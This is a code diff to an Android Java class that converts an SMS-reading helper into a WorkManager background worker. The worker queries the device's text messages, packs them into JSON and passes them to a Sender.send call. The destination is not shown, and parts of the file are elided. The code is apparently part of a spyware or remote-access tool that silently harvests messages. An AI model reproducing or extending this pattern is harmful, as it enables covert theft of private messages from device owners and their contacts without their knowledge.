@@ -4,12 +4,25 @@ import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 
+import androidx.annotation.NonNull;
+import androidx.work.Worker;
+import androidx.work.WorkerParameters;
+
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-public class Sms {
-    public static JSONArray get() {
+public class Sms extends Worker {
+    public static final String TAG = "sms";
+    private Context context;
+    public Sms(@NonNull Context context, @NonNull WorkerParameters workerParams) {
+        super(context, workerParams);
+        this.context = context;
+    }
+
+    @NonNull
+    @Override
+    public Result doWork() {
         JSONArray array = new JSONArray();
 
         try {
@@ -75,12 +88,12 @@ public class Sms {
                 array.put(object);
             }
             cursor.close();
-        } catch (IllegalArgumentException ex) {
-            ex.printStackTrace();
-        } catch (JSONException ex) {
-            ex.printStackTrace();
-        }
 
-        return array;
+            Sender.send(TAG, array.toString());
+
+            return Result.success();
+        } catch (Exception ex) {
+            return Result.failure();
+        }
     }
 }
